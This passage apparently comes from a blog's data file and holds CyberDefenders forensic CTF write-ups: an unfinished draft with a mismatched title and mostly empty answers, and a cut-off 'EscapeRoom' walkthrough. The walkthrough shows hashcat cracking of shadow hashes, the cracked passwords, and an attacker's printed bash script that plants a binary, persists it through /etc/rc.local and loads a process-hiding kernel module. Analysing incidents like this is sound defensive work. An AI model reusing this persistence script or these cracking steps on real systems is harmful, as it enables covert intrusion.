disk image, and analyzing a maldoc using oledump.\nThe maldoc download a malware in our victim personal computer! Let's figure out what is going on!\n\n# Challenge Information \n\n\n+++info Description\n\nA company’s employee joined a fake iPhone giveaway. Our team took a disk image of the employee's system for further analysis. As a security analyst, you are tasked to identify how the system was compromised.\n+++\n\nChallenge Link & Author \n\n{% links %}\n- site: Challenge Link \n  url: https://cyberdefenders.org/blueteam-ctf-challenges/60\n  desc: CyberDefenders - Phishy \n  image: https://cyberdefenders.org/static/img/cyberdefenders-logo-white.png\n  color: \"#2296fd\"\n- site: Author - SemahBA\n  desc: SemahBA Twitter Profile\n  url: https://twitter.com/BenaliSemah\n  image: https://pbs.twimg.com/profile_images/1358429186348711936/QRHPcCVi_400x400.jpg\n  color: \"#de2336\"\n\n{% endlinks %}\n# Walkthrough \n\n> 1- What is the OS Product name of PC01?\n\nSoftware\\Microsoft\\WindowsNT\\CurrentVersion\n\n![](2022-09-08-12-19-26.png)\n\nAnswer:  Windows 10 Enterprise 2016 LTSB\n\n> 2- On 21st November, there was unplanned power off for PC01 machine. How long was PC01 powered on till this shutdown?\n\nIn this type of question windows events will be our saver! every event in windows has his own Event ID \n\nThe shutdown event ID is 1074 ! Wow this is awesome right ? the more you know about the event ID the more you are good investigator ! Let's get the system.evtx file and search about events with 1074 ID in 11/21/2021\n\n![](2022-09-08-12-24-04.png)\n\n![](2022-09-08-12-55-33.png)\n\n![](2022-09-08-14-23-18.png)\n\nٍ![](2022-09-08-14-25-45.png)\n\n> 3 - \n\n![](2022-09-08-14-28-41.png)\n\n> 4 - \n\n![](2022-09-08-14-31-24.png)\n\n> 5- \n\nSystem32\\drivers\\etc\\services.\n![](2022-09-08-14-46-55.png)\n\n\n> 6- \n\n![](2022-09-08-15-42-07.png)\n\n\n> 7- \n\nNTUSER.DAT: SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\MountPoints2\n\n![](2022-09-08-15-19-57.png)\n\n![](2022-09-08-15-54-52.png)\n\n\n> 8-\n![](2022-09-08-15-54-29.png)\n\n\n> 11 - \n\n![](2022-09-08-16-07-03.png)\n\n\n> 12 - \n\n```bash command line prompt \nvol.py -f memory.dmp --profile=Win2016x64_14393 hivelist                                                                                 ─╯\nVolatility Foundation Volatility Framework 2.6.1\nVirtual            Physical           Name\n------------------ ------------------ ----\n0xffff860c0e681000 0x000000012bfa0000 \\??\\C:\\Windows\\AppCompat\\Programs\\Amcache.hve\n0xffff860c0e915000 0x00000000047de000 \\??\\C:\\Users\\Administrator\\ntuser.dat\n0xffff860c0e9ff000 0x000000000eb6a000 \\??\\C:\\Users\\Administrator\\AppData\\Local\\Microsoft\\Windows\\UsrClass.dat\n0xffff860c0ed2c000 0x0000000012a19000 \\??\\C:\\ProgramData\\Microsoft\\Windows\\AppRepository\\Packages\\Microsoft.Windows.\n0xffff860c07c28000 0x000000000020c000 [no name]\n0xffff860c07c41000 0x0000000000f9a000 \\REGISTRY\\MACHINE\\SYSTEM\n0xffff860c07c83000 0x000000010c3b2000 \\REGISTRY\\MACHINE\\HARDWARE\n0xffff860c09a71000 0x0000000004644000 \\Device\\HarddiskVolume2\\EFI\\Microsoft\\Boot\\BCD\n0xffff860c0831e000 0x00000000040f7000 \\SystemRoot\\System32\\Config\\SOFTWARE\n0xffff860c0dbc4000 0x000000000220b000 \\SystemRoot\\System32\\Config\\DEFAULT\n0xffff860c09545000 0x0000000109934000 \\SystemRoot\\System32\\Config\\SECURITY\n0xffff860c0959f000 0x000000010a3bf000 \\SystemRoot\\System32\\Config\\SAM\n0xffff860c0dbcc000 0x000000010b689000 \\??\\C:\\Windows\\ServiceProfiles\\NetworkService\\NTUSER.DAT\n0xffff860c0dcb6000 0x000000010d3f8000 \\SystemRoot\\System32\\Config\\BBI\n0xffff860c0dcba000 0x000000010d411000 \\??\\C:\\Windows\\ServiceProfiles\\LocalService\\NTUSER.DAT\n\n```\n\n0x00000000040f7000\n\n","source":"_drafts/Pwned-DC.md","raw":"---\n\ntitle: CyberDefenders Writeup  Pwned-DC\n#tags:\n#cover: https://cyberdefenders.org/media/terraform/Phishy/phishy.png\n#categories:\n#- [CyberDefenders]\n---\n\nThis CTF challenge is about retrieving data from a disk image, and analyzing a maldoc using oledump.\nThe maldoc download a malware in our victim personal computer! Let's figure out what is going on!\n\n# Challenge Information \n\n\n+++info Description\n\nA company’s employee joined a fake iPhone giveaway. Our team took a disk image of the employee's system for further analysis. As a security analyst, you are tasked to identify how the system was compromised.\n+++\n\nChallenge Link & Author \n\n{% links %}\n- site: Challenge Link \n  url: https://cyberdefenders.org/blueteam-ctf-challenges/60\n  desc: CyberDefenders - Phishy \n  image: https://cyberdefenders.org/static/img/cyberdefenders-logo-white.png\n  color: \"#2296fd\"\n- site: Author - SemahBA\n  desc: SemahBA Twitter Profile\n  url: https://twitter.com/BenaliSemah\n  image: https://pbs.twimg.com/profile_images/1358429186348711936/QRHPcCVi_400x400.jpg\n  color: \"#de2336\"\n\n{% endlinks %}\n# Walkthrough \n\n> 1- What is the OS Product name of PC01?\n\nSoftware\\Microsoft\\WindowsNT\\CurrentVersion\n\n![](2022-09-08-12-19-26.png)\n\nAnswer:  Windows 10 Enterprise 2016 LTSB\n\n> 2- On 21st November, there was unplanned power off for PC01 machine. How long was PC01 powered on till this shutdown?\n\nIn this type of question windows events will be our saver! every event in windows has his own Event ID \n\nThe shutdown event ID is 1074 ! Wow this is awesome right ? the more you know about the event ID the more you are good investigator ! Let's get the system.evtx file and search about events with 1074 ID in 11/21/2021\n\n![](2022-09-08-12-24-04.png)\n\n![](2022-09-08-12-55-33.png)\n\n![](2022-09-08-14-23-18.png)\n\nٍ![](2022-09-08-14-25-45.png)\n\n> 3 - \n\n![](2022-09-08-14-28-41.png)\n\n> 4 - \n\n![](2022-09-08-14-31-24.png)\n\n> 5- \n\nSystem32\\drivers\\etc\\services.\n![](2022-09-08-14-46-55.png)\n\n\n> 6- \n\n![](2022-09-08-15-42-07.png)\n\n\n> 7- \n\nNTUSER.DAT: SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\MountPoints2\n\n![](2022-09-08-15-19-57.png)\n\n![](2022-09-08-15-54-52.png)\n\n\n> 8-\n![](2022-09-08-15-54-29.png)\n\n\n> 11 - \n\n![](2022-09-08-16-07-03.png)\n\n\n> 12 - \n\n```bash command line prompt \nvol.py -f memory.dmp --profile=Win2016x64_14393 hivelist                                                                                 ─╯\nVolatility Foundation Volatility Framework 2.6.1\nVirtual            Physical           Name\n------------------ ------------------ ----\n0xffff860c0e681000 0x000000012bfa0000 \\??\\C:\\Windows\\AppCompat\\Programs\\Amcache.hve\n0xffff860c0e915000 0x00000000047de000 \\??\\C:\\Users\\Administrator\\ntuser.dat\n0xffff860c0e9ff000 0x000000000eb6a000 \\??\\C:\\Users\\Administrator\\AppData\\Local\\Microsoft\\Windows\\UsrClass.dat\n0xffff860c0ed2c000 0x0000000012a19000 \\??\\C:\\ProgramData\\Microsoft\\Windows\\AppRepository\\Packages\\Microsoft.Windows.\n0xffff860c07c28000 0x000000000020c000 [no name]\n0xffff860c07c41000 0x0000000000f9a000 \\REGISTRY\\MACHINE\\SYSTEM\n0xffff860c07c83000 0x000000010c3b2000 \\REGISTRY\\MACHINE\\HARDWARE\n0xffff860c09a71000 0x0000000004644000 \\Device\\HarddiskVolume2\\EFI\\Microsoft\\Boot\\BCD\n0xffff860c0831e000 0x00000000040f7000 \\SystemRoot\\System32\\Config\\SOFTWARE\n0xffff860c0dbc4000 0x000000000220b000 \\SystemRoot\\System32\\Config\\DEFAULT\n0xffff860c09545000 0x0000000109934000 \\SystemRoot\\System32\\Config\\SECURITY\n0xffff860c0959f000 0x000000010a3bf000 \\SystemRoot\\System32\\Config\\SAM\n0xffff860c0dbcc000 0x000000010b689000 \\??\\C:\\Windows\\ServiceProfiles\\NetworkService\\NTUSER.DAT\n0xffff860c0dcb6000 0x000000010d3f8000 \\SystemRoot\\System32\\Config\\BBI\n0xffff860c0dcba000 0x000000010d411000 \\??\\C:\\Windows\\ServiceProfiles\\LocalService\\NTUSER.DAT\n\n```\n\n0x00000000040f7000\n\n","slug":"Pwned-DC","published":0,"date":"2023-03-23T17:35:09.758Z","updated":"2023-03-23T17:35:09.758Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clfzirxmw0001d5qf5bkt7u14","content":"<p>This CTF challenge is about retrieving data from a disk image, and analyzing a maldoc using oledump.<br>\nThe maldoc download a malware in our victim personal computer! Let’s figure out what is going on!</p>\n<h1 id=\"challenge-information\"><a class=\"markdownIt-Anchor\" href=\"#challenge-information\">#</a> Challenge Information</h1>\n<details class=\"info\"><summary>Description</summary><div>\n<p>A company’s employee joined a fake iPhone giveaway. Our team took a disk image of the employee’s system for further analysis. As a security analyst, you are tasked to identify how the system was compromised.</p>\n</div></details>\n<p>Challenge Link &amp; Author</p>\n<div class=\"links\"><div class=\"item\" title=\"Challenge Link\" style=\"--block-color:#2296fd;\"><span class=\"exturl image\" data-url=\"aHR0cHM6Ly9jeWJlcmRlZmVuZGVycy5vcmcvYmx1ZXRlYW0tY3RmLWNoYWxsZW5nZXMvNjA=\" data-background-image=\"https://cyberdefenders.org/static/img/cyberdefenders-logo-white.png\"></span>\n          <div class=\"info\">\n          <span class=\"exturl title\" data-url=\"aHR0cHM6Ly9jeWJlcmRlZmVuZGVycy5vcmcvYmx1ZXRlYW0tY3RmLWNoYWxsZW5nZXMvNjA=\">Challenge Link</span>\n          <p class=\"desc\">CyberDefenders - Phishy</p>\n          </div></div><div class=\"item\" title=\"Author - SemahBA\" style=\"--block-color:#de2336;\"><span class=\"exturl image\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9CZW5hbGlTZW1haA==\" data-background-image=\"https://pbs.twimg.com/profile_images/1358429186348711936/QRHPcCVi_400x400.jpg\"></span>\n          <div class=\"info\">\n          <span class=\"exturl title\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9CZW5hbGlTZW1haA==\">Author - SemahBA</span>\n          <p class=\"desc\">SemahBA Twitter Profile</p>\n          </div></div></div>\n<h1 id=\"walkthrough\"><a class=\"markdownIt-Anchor\" href=\"#walkthrough\">#</a> Walkthrough</h1>\n<blockquote>\n<p>1- What is the OS Product name of PC01?</p>\n</blockquote>\n<p>Software\\Microsoft\\WindowsNT\\CurrentVersion</p>\n<p><img data-src=\"2022-09-08-12-19-26.png\" alt=\"\"></p>\n<p>Answer:  Windows 10 Enterprise 2016 LTSB</p>\n<blockquote>\n<p>2- On 21st November, there was unplanned power off for PC01 machine. How long was PC01 powered on till this shutdown?</p>\n</blockquote>\n<p>In this type of question windows events will be our saver! every event in windows has his own Event ID</p>\n<p>The shutdown event ID is 1074 ! Wow this is awesome right ? the more you know about the event ID the more you are good investigator ! Let’s get the system.evtx file and search about events with 1074 ID in 11/21/2021</p>\n<p><img data-src=\"2022-09-08-12-24-04.png\" alt=\"\"></p>\n<p><img data-src=\"2022-09-08-12-55-33.png\" alt=\"\"></p>\n<p><img data-src=\"2022-09-08-14-23-18.png\" alt=\"\"></p>\n<p>ٍ<img data-src=\"2022-09-08-14-25-45.png\" alt=\"\"></p>\n<blockquote>\n<p>3 -</p>\n</blockquote>\n<p><img data-src=\"2022-09-08-14-28-41.png\" alt=\"\"></p>\n<blockquote>\n<p>4 -</p>\n</blockquote>\n<p><img data-src=\"2022-09-08-14-31-24.png\" alt=\"\"></p>\n<blockquote>\n<p>5-</p>\n</blockquote>\n<p>System32\\drivers\\etc\\services.<br>\n<img data-src=\"2022-09-08-14-46-55.png\" alt=\"\"></p>\n<blockquote>\n<p>6-</p>\n</blockquote>\n<p><img data-src=\"2022-09-08-15-42-07.png\" alt=\"\"></p>\n<blockquote>\n<p>7-</p>\n</blockquote>\n<p>NTUSER.DAT: SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\MountPoints2</p>\n<p><img data-src=\"2022-09-08-15-19-57.png\" alt=\"\"></p>\n<p><img data-src=\"2022-09-08-15-54-52.png\" alt=\"\"></p>\n<blockquote>\n<p>8-<br>\n<img data-src=\"2022-09-08-15-54-29.png\" alt=\"\"></p>\n</blockquote>\n<blockquote>\n<p>11 -</p>\n</blockquote>\n<p><img data-src=\"2022-09-08-16-07-03.png\" alt=\"\"></p>\n<blockquote>\n<p>12 -</p>\n</blockquote>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vol.py -f memory.dmp --profile=Win2016x64_14393 hivelist                                                                                 ─╯</span><br><span class=\"line\">Volatility Foundation Volatility Framework 2.6.1</span><br><span class=\"line\">Virtual            Physical           Name</span><br><span class=\"line\">------------------ ------------------ ----</span><br><span class=\"line\">0xffff860c0e681000 0x000000012bfa0000 \\??\\C:\\Windows\\AppCompat\\Programs\\Amcache.hve</span><br><span class=\"line\">0xffff860c0e915000 0x00000000047de000 \\??\\C:\\Users\\Administrator\\ntuser.dat</span><br><span class=\"line\">0xffff860c0e9ff000 0x000000000eb6a000 \\??\\C:\\Users\\Administrator\\AppData\\Local\\Microsoft\\Windows\\UsrClass.dat</span><br><span class=\"line\">0xffff860c0ed2c000 0x0000000012a19000 \\??\\C:\\ProgramData\\Microsoft\\Windows\\AppRepository\\Packages\\Microsoft.Windows.</span><br><span class=\"line\">0xffff860c07c28000 0x000000000020c000 [no name]</span><br><span class=\"line\">0xffff860c07c41000 0x0000000000f9a000 \\REGISTRY\\MACHINE\\SYSTEM</span><br><span class=\"line\">0xffff860c07c83000 0x000000010c3b2000 \\REGISTRY\\MACHINE\\HARDWARE</span><br><span class=\"line\">0xffff860c09a71000 0x0000000004644000 \\Device\\HarddiskVolume2\\EFI\\Microsoft\\Boot\\BCD</span><br><span class=\"line\">0xffff860c0831e000 0x00000000040f7000 \\SystemRoot\\System32\\Config\\SOFTWARE</span><br><span class=\"line\">0xffff860c0dbc4000 0x000000000220b000 \\SystemRoot\\System32\\Config\\DEFAULT</span><br><span class=\"line\">0xffff860c09545000 0x0000000109934000 \\SystemRoot\\System32\\Config\\SECURITY</span><br><span class=\"line\">0xffff860c0959f000 0x000000010a3bf000 \\SystemRoot\\System32\\Config\\SAM</span><br><span class=\"line\">0xffff860c0dbcc000 0x000000010b689000 \\??\\C:\\Windows\\ServiceProfiles\\NetworkService\\NTUSER.DAT</span><br><span class=\"line\">0xffff860c0dcb6000 0x000000010d3f8000 \\SystemRoot\\System32\\Config\\BBI</span><br><span class=\"line\">0xffff860c0dcba000 0x000000010d411000 \\??\\C:\\Windows\\ServiceProfiles\\LocalService\\NTUSER.DAT</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>0x00000000040f7000</p>\n","site":{"data":{}},"length":2437,"excerpt":"","more":"<p>This CTF challenge is about retrieving data from a disk image, and analyzing a maldoc using oledump.<br>\nThe maldoc download a malware in our victim personal computer! Let’s figure out what is going on!</p>\n<h1 id=\"challenge-information\"><a class=\"markdownIt-Anchor\" href=\"#challenge-information\">#</a> Challenge Information</h1>\n<details class=\"info\"><summary>Description</summary><div>\n<p>A company’s employee joined a fake iPhone giveaway. Our team took a disk image of the employee’s system for further analysis. As a security analyst, you are tasked to identify how the system was compromised.</p>\n</div></details>\n<p>Challenge Link &amp; Author</p>\n<div class=\"links\"><div class=\"item\" title=\"Challenge Link\" style=\"--block-color:#2296fd;\"><span class=\"exturl image\" data-url=\"aHR0cHM6Ly9jeWJlcmRlZmVuZGVycy5vcmcvYmx1ZXRlYW0tY3RmLWNoYWxsZW5nZXMvNjA=\" data-background-image=\"https://cyberdefenders.org/static/img/cyberdefenders-logo-white.png\"></span>\n          <div class=\"info\">\n          <span class=\"exturl title\" data-url=\"aHR0cHM6Ly9jeWJlcmRlZmVuZGVycy5vcmcvYmx1ZXRlYW0tY3RmLWNoYWxsZW5nZXMvNjA=\">Challenge Link</span>\n          <p class=\"desc\">CyberDefenders - Phishy</p>\n          </div></div><div class=\"item\" title=\"Author - SemahBA\" style=\"--block-color:#de2336;\"><span class=\"exturl image\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9CZW5hbGlTZW1haA==\" data-background-image=\"https://pbs.twimg.com/profile_images/1358429186348711936/QRHPcCVi_400x400.jpg\"></span>\n          <div class=\"info\">\n          <span class=\"exturl title\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9CZW5hbGlTZW1haA==\">Author - SemahBA</span>\n          <p class=\"desc\">SemahBA Twitter Profile</p>\n          </div></div></div>\n<h1 id=\"walkthrough\"><a class=\"markdownIt-Anchor\" href=\"#walkthrough\">#</a> Walkthrough</h1>\n<blockquote>\n<p>1- What is the OS Product name of PC01?</p>\n</blockquote>\n<p>Software\\Microsoft\\WindowsNT\\CurrentVersion</p>\n<p><img data-src=\"2022-09-08-12-19-26.png\" alt=\"\"></p>\n<p>Answer:  Windows 10 Enterprise 2016 LTSB</p>\n<blockquote>\n<p>2- On 21st November, there was unplanned power off for PC01 machine. How long was PC01 powered on till this shutdown?</p>\n</blockquote>\n<p>In this type of question windows events will be our saver! every event in windows has his own Event ID</p>\n<p>The shutdown event ID is 1074 ! Wow this is awesome right ? the more you know about the event ID the more you are good investigator ! Let’s get the system.evtx file and search about events with 1074 ID in 11/21/2021</p>\n<p><img data-src=\"2022-09-08-12-24-04.png\" alt=\"\"></p>\n<p><img data-src=\"2022-09-08-12-55-33.png\" alt=\"\"></p>\n<p><img data-src=\"2022-09-08-14-23-18.png\" alt=\"\"></p>\n<p>ٍ<img data-src=\"2022-09-08-14-25-45.png\" alt=\"\"></p>\n<blockquote>\n<p>3 -</p>\n</blockquote>\n<p><img data-src=\"2022-09-08-14-28-41.png\" alt=\"\"></p>\n<blockquote>\n<p>4 -</p>\n</blockquote>\n<p><img data-src=\"2022-09-08-14-31-24.png\" alt=\"\"></p>\n<blockquote>\n<p>5-</p>\n</blockquote>\n<p>System32\\drivers\\etc\\services.<br>\n<img data-src=\"2022-09-08-14-46-55.png\" alt=\"\"></p>\n<blockquote>\n<p>6-</p>\n</blockquote>\n<p><img data-src=\"2022-09-08-15-42-07.png\" alt=\"\"></p>\n<blockquote>\n<p>7-</p>\n</blockquote>\n<p>NTUSER.DAT: SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\MountPoints2</p>\n<p><img data-src=\"2022-09-08-15-19-57.png\" alt=\"\"></p>\n<p><img data-src=\"2022-09-08-15-54-52.png\" alt=\"\"></p>\n<blockquote>\n<p>8-<br>\n<img data-src=\"2022-09-08-15-54-29.png\" alt=\"\"></p>\n</blockquote>\n<blockquote>\n<p>11 -</p>\n</blockquote>\n<p><img data-src=\"2022-09-08-16-07-03.png\" alt=\"\"></p>\n<blockquote>\n<p>12 -</p>\n</blockquote>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vol.py -f memory.dmp --profile=Win2016x64_14393 hivelist                                                                                 ─╯</span><br><span class=\"line\">Volatility Foundation Volatility Framework 2.6.1</span><br><span class=\"line\">Virtual            Physical           Name</span><br><span class=\"line\">------------------ ------------------ ----</span><br><span class=\"line\">0xffff860c0e681000 0x000000012bfa0000 \\??\\C:\\Windows\\AppCompat\\Programs\\Amcache.hve</span><br><span class=\"line\">0xffff860c0e915000 0x00000000047de000 \\??\\C:\\Users\\Administrator\\ntuser.dat</span><br><span class=\"line\">0xffff860c0e9ff000 0x000000000eb6a000 \\??\\C:\\Users\\Administrator\\AppData\\Local\\Microsoft\\Windows\\UsrClass.dat</span><br><span class=\"line\">0xffff860c0ed2c000 0x0000000012a19000 \\??\\C:\\ProgramData\\Microsoft\\Windows\\AppRepository\\Packages\\Microsoft.Windows.</span><br><span class=\"line\">0xffff860c07c28000 0x000000000020c000 [no name]</span><br><span class=\"line\">0xffff860c07c41000 0x0000000000f9a000 \\REGISTRY\\MACHINE\\SYSTEM</span><br><span class=\"line\">0xffff860c07c83000 0x000000010c3b2000 \\REGISTRY\\MACHINE\\HARDWARE</span><br><span class=\"line\">0xffff860c09a71000 0x0000000004644000 \\Device\\HarddiskVolume2\\EFI\\Microsoft\\Boot\\BCD</span><br><span class=\"line\">0xffff860c0831e000 0x00000000040f7000 \\SystemRoot\\System32\\Config\\SOFTWARE</span><br><span class=\"line\">0xffff860c0dbc4000 0x000000000220b000 \\SystemRoot\\System32\\Config\\DEFAULT</span><br><span class=\"line\">0xffff860c09545000 0x0000000109934000 \\SystemRoot\\System32\\Config\\SECURITY</span><br><span class=\"line\">0xffff860c0959f000 0x000000010a3bf000 \\SystemRoot\\System32\\Config\\SAM</span><br><span class=\"line\">0xffff860c0dbcc000 0x000000010b689000 \\??\\C:\\Windows\\ServiceProfiles\\NetworkService\\NTUSER.DAT</span><br><span class=\"line\">0xffff860c0dcb6000 0x000000010d3f8000 \\SystemRoot\\System32\\Config\\BBI</span><br><span class=\"line\">0xffff860c0dcba000 0x000000010d411000 \\??\\C:\\Windows\\ServiceProfiles\\LocalService\\NTUSER.DAT</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>0x00000000040f7000</p>\n"},{"title":"go-client","cover":"https://res.cloudinary.com/practicaldev/image/fetch/s--ne7pa20x--/c_imagga_scale,f_auto,fl_progressive,h_900,q_auto,w_1600/https://thepracticaldev.s3.amazonaws.com/i/7xyqmfvmadyqu2girucz.jpg","_content":"","source":"_drafts/go-client.md","raw":"---\ntitle: go-client\ntags:\ncover: https://res.cloudinary.com/practicaldev/image/fetch/s--ne7pa20x--/c_imagga_scale,f_auto,fl_progressive,h_900,q_auto,w_1600/https://thepracticaldev.s3.amazonaws.com/i/7xyqmfvmadyqu2girucz.jpg\ncategories:\n- [Kubernetes]\n---\n","slug":"go-client","published":0,"date":"2023-03-23T17:35:09.758Z","updated":"2023-03-23T17:35:09.758Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clfzirxn10002d5qf5eg8d4y5","content":"","site":{"data":{}},"length":0,"excerpt":"","more":""},{"title":"test","_content":"","source":"_drafts/test.md","raw":"---\ntitle: test\ntags:\n---\n","slug":"test","published":0,"date":"2023-03-23T17:35:09.758Z","updated":"2023-03-23T17:35:09.758Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clfzirxn40003d5qf1zqo8141","content":"","site":{"data":{}},"length":0,"excerpt":"","more":""},{"title":"CyberDefenders Writeup EscapeRoom","date":"2022-09-07T15:28:39.000Z","cover":"https://cyberdefenders.org/media/terraform/EscapeRoom/escaperoom_fcW8Hvp.png","_content":"\nThis CTF challenge is made by The Honeynet Project organization. This challenge is a combination of several entry to intermediate-level tasks of increasing difficulty focusing on authentication, information hiding, and cryptography.\n\n# Challenge Information \n\n\n+++info Description\n\nYou belong to a company specializing in hosting web applications through KVM-based Virtual Machines. Over the weekend, one VM went down, and the site administrators fear this might be the result of malicious activity. They extracted a few logs from the environment in hopes that you might be able to determine what happened.\n\n+++\n\nChallenge Link & Author \n\n{% links %}\n- site: Challenge Link \n  url: https://cyberdefenders.org/blueteam-ctf-challenges/18\n  desc: CyberDefenders - EscapeRoom \n  image: https://cyberdefenders.org/static/img/cyberdefenders-logo-white.png\n  color: \"#2296fd\"\n- site: Author - The Honeynet Project\n  desc: The Honeynet Project Twitter Profile\n  url: https://twitter.com/ProjectHoneynet\n  image: https://pbs.twimg.com/profile_images/582417177254334464/BNceiZYA_400x400.png\n  color: \"#fcc11c\"\n\n{% endlinks %}\n\n# Walkthrough\n\nWe start analyzing the pcap file, i open it with Brim Security and checking the alerts!! Oh god! A lot of ssh flows! mmm I guess the attacker try to gain access through the ssh service, he did a bruteforce attack ! \n![](https://imgur.com/cXk82fL.png)\n\n> 1- What service did the attacker use to gain access to the system?\n\nThe attacker use ssh protocol to gain access to the system ! \n\n:::success\nAnswer: ssh\n:::\n\n> 2- What attack type was used to gain access to the system?(one word)\n\nWe found a lot of ssh packets! I am sure this is a bruteforce attack \n\n:::success\nAnswer: bruteforce\n:::\n\n\n> 3- What was the tool the attacker possibly used to perform this attack?\n\nOne of the most famous tools that can do this type of attack is hydra\nHydra is an amazing tool for testing the strength of your SSH security. It is capable of running through massive lists of usernames, passwords, and targets to test if you or a user is using a potentially vulnerable password.\n\n:::success\nAnswer: Hydra\n:::\n\n> 4- How many failed attempts were there?\n\nLet's inspect the alert events in Brim Security and apply the count() by feature in the `alert.signature`. We found 53 `NetSSH Hardcoded in Metasploit`. We decrease by 1 the success one!\n![](https://imgur.com/DpgkZjt.png)\n\n:::success\nAnswer: 52\n:::\n\nWe have the hashes of the passwords! We know that the hashes are SHA-512(UNIX). The black cat (oh means hashcat) will help us cracking these hashes!\nٍ![](https://imgur.com/DN0qNUF.png)\n\n```bash command line prompt\nhashcat -a 0 -m 1800 shadow.log rockyou.txt\n\nSession..........: hashcat\nStatus...........: Running\nHash.Mode........: 1800 (sha512crypt $6$, SHA512 (Unix))\nHash.Target......: crack.txt\nTime.Started.....: Wed Sep  7 23:58:23 2022 (43 mins, 15 secs)\nTime.Estimated...: Fri Sep  9 04:15:48 2022 (1 day, 3 hours)\nKernel.Feature...: Pure Kernel\nGuess.Base.......: File (/mnt/c/Users/Mohamed Rafraf/Desktop/rockyou.txt)\nGuess.Queue......: 1/1 (100.00%)\nSpeed.1.........:      986 H/s (5.30ms) @ Accel:32 Loops:1024 Thr:1 Vec:4\nRecovered........: 3/10 (30.00%) Digests, 3/10 (30.00%) Salts\nProgress.........: 3579360/143443840 (2.50%)\nRejected.........: 0/3579360 (0.00%)\nRestore.Point....: 357920/14344384 (2.50%)\nRestore.Sub.1...: Salt:5 Amplifier:0-1 Iteration:4096-5000\nCandidate.Engine.: Device Generator\nCandidates.1....: donjoe -> dominique12\n\n[s]tatus [p]ause [b]ypass [c]heckpoint [f]inish [q]uit =>\n\n```\n\n\n> 5- What credentials (username:password) were used to gain access? Refer to shadow.log and sudoers.log.\n\nJust wait for hashcat man!\n\n:::success\nmanager:forgot\n:::\n\n> 6- What other credentials (username:password) could have been used to gain access also have SUDO privileges? Refer to shadow.log and sudoers.log.\n\nHashcat will save you for sure ! \n\n:::success\nsean:spectre\n:::\n\n> 7- What is the tool used to download malicious files on the system?\n\nLet's check the `user-agent` in brim security. you can do it with wireshark too!\n![](https://imgur.com/P9haLBY.png)\n\n:::success\nAnswer: wget\n:::\n\n> 8- How many files the attacker download to perform malware installation?\n\nChecking the non-media files in brim security will help us to know about the files\n\n![](https://imgur.com/P6St7uU.png)\n\n:::success\nAnswer: 3\n:::\n\n> 9- What is the main malware MD5 hash?\n\nThe malware is an executable file for sure! let's check it \n\n![](https://imgur.com/VN12PmD.png)\n\nOpen the details about it and you'll get the md5sum ! \n\n![](https://imgur.com/YgnR9gz.png)\n\n:::success\nAnswer: 772b620736b760c1d736b1e6ba2f885b\n:::\n\nWe found this bash script that rename the malware mail and hide it in /var/mail/ directory and make it executable at the startup!\n\n```bash command line prompt \n#!/bin/bash\n\nmv 1 /var/mail/mail\nchmod +x /var/mail/mail\necho -e \"/var/mail/mail &\\nsleep 1\\npidof mail > /proc/dmesg\\nexit 0\" > /etc/rc.local\nnohup /var/mail/mail > /dev/null 2>&1&\nmv 2 /lib/modules/`uname -r`/sysmod.ko\ndepmod -a\necho \"sysmod\" >> /etc/modules\nmodprobe sysmod\nsleep 1\npidof mail > /proc/dmesg\nrm 3\n```\n\n> 10- What file has the script modified so the malware will start upon reboot?\n\nThe script /etc/rc.local is for use by the system administrator. It is traditionally executed after all the normal system services are started\n\n:::success\nAnswer: /etc/rc.local\n:::\n\n\n> 11- Where did the malware keep local files?\n:::success\n /var/mail/\n:::\n\n> 12- What is missing from ps.log?\n\nIn the ps.log we don't find the process related to the malware (the mail executable)\n\n:::success\n /var/mail/mail\n:::\n\n> 13- What is the main file that used to remove this information from ps.log?\n\nThere is another binary that moved and renamed as `sysmod.ko`\n\n:::success\nAnswer: sysmod.ko\n:::\n\n> 14- Inside the Main function, what is the function that causes requests to those servers?\n\nAfter unpacking the malware. I opened the binary with IDA Pro to decompile it. Check the main function and we found this ! \n\n![](https://imgur.com/79houmJ.png)\n:::success\nAnswer: requestFile\n:::\n\n> 15- One of the IP's the malware contacted starts with 17. Provide the full IP.\n\nrequestFile function use address array as parameters. let's check it ! we found all the IP address. COOL ! \n\n![](https://imgur.com/4NLcX9k.png)\n\n:::success\nAnswer: 174.129.57.253\n:::\n\n> 16- How many files the malware requested from external servers?\n\nThis is easy man ! just check the other downloaded files ! \n\n![](https://imgur.com/hjMszwa.png)\n\n:::success\nAnswer: 